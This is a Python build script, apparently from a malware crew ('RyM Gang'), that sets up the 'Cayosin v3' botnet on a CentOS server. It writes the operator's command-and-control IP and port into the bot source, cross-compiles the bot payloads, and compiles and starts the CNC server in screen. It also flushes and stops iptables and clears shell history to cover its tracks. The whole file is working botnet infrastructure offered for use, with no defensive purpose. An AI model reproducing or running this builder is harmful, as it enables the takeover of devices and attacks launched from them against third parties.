#!/usr/bin/python
#Cayosin v3 Auto-Builder for Centos by Tragedy

import sys
import time
import subprocess
import warnings
import fileinput

if len(sys.argv) < 5:
	print("\x1b[31m[SYNTAX ERROR] Usage: python %s [IP] [BINSPREFIX] [CNCPORT] [BOTPORT]\x1b[0m" % sys.argv[0])
	sys.exit()

hst = sys.argv[1]
prf = sys.argv[2]
cp = sys.argv[3]
bp = sys.argv[4]

def run(cmd):
	subprocess.call(cmd, shell=True)

print ("\x1b[1;36m[+] Welcome to Cayosin v3 [+]")
print ("\x1b[1;36m[+] Simply Load All Cayosin Files Into /root/")
print ("\x1b[1;36m[+] No Need To Change Anything In Them")
raw_input ("\x1b[1;36m[+] When All Files Are Loaded, Press Enter to Start Building...")

print ("\x1b[1;36mCayosin v3 - Auto-Build Process Initiated...")
time.sleep(2)

#Typesizes
print ("\x1b[1;36m[+] Changing Maximum File Descriptor Size...")
fdsize = open("/usr/include/bits/typesizes.h","r").readlines()
fdsizew = open("/usr/include/bits/typesizes.h","w").write("")
for line in fdsize:
    line = line.replace("1024","1000000")
    fdsizew = open("/usr/include/bits/typesizes.h","a").write(line)
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Maximum File Descriptor Size Changed Successfully...")
time.sleep(2)

#Depos
print ("\x1b[1;36m[+] Installing Packages and Dependencies...")
time.sleep(1)
run ("yum update -y; yum install wget python python-paramiko gcc nano screen httpd php bzip2 -y; service httpd start; ulimit -n 99999")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Packages/Dependencies Installed...")

#Bot
print ("\x1b[1;36m[+] Compiling Cayosin Bot...")
time.sleep(2)

hstc = hst.split('.', 4)
addr1 = hstc[0]
addr2 = hstc[1]
addr3 = hstc[2]
addr4 = hstc[3]

old1 = "hacks[] "
new1 = "int hacks[] = {"+ addr1 +"};\n"
x = fileinput.input(files="/root/cy/main.c", inplace=1)
for line in x:
    if old1 in line:
        line = new1
    print line,
x.close()
old2 = "hacks2[] "
new2 = "int hacks2[] = {"+ addr2 +"};\n"
x = fileinput.input(files="/root/cy/main.c", inplace=1)
for line in x:
    if old2 in line:
        line = new2
    print line,
x.close()
old3 = "hacks3[] "
new3 = "int hacks3[] = {"+ addr3 +"};\n"
x = fileinput.input(files="/root/cy/main.c", inplace=1)
for line in x:
    if old3 in line:
        line = new3
    print line,
x.close()
old4 = "hacks4[] "
new4 = "int hacks4[] = {"+ addr4 +"};\n"
x = fileinput.input(files="/root/cy/main.c", inplace=1)
for line in x:
    if old4 in line:
        line = new4
    print line,
x.close()
old5 = "hakai_bp "
new5 = "int hakai_bp = "+ bp +";\n"
x = fileinput.input(files="/root/cy/main.c", inplace=1)
for line in x:
    if old5 in line:
        line = new5
    print line,
x.close()
run ("chmod 777 *; python Cayosin.py fff "+ hst +" "+ prf +"; rm -rf cy; mv iplookup.php /var/www/html; rm -rf Cayosin.py; rm -rf cross-compiler-*")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Cayosin Bot Compiled...")
print ("\x1b[1;36m[\x1b[1;33m!\x1b[1;36m] YOUR PAYLOAD IS ABOVE. COPY AND SAVE IT.")

#CNC
raw_input ("\x1b[1;36mPress Enter to Build CNC - Detach with CNTRL+A+D Afterwards...")
run ("chmod 777 *; gcc -o c2 CNC.c -pthread; rm -rf CNC.c; iptables -F; service iptables stop; screen -S Cayo ./c2 "+ cp +" "+ bp +"; history -c")

print ("\x1b[1;36m[+] Cayosin Built Successfully. [+]")
print ("\x1b[1;36m[\x1b[1;33m!\x1b[1;36m] To View CNC Screen: \x1b[1;33mscreen -xS Cayo \x1b[1;36m[\x1b[1;33m!\x1b[1;36m]")
print ("\x1b[1;36m[RyM Gang]\x1b[0m")
exit(1)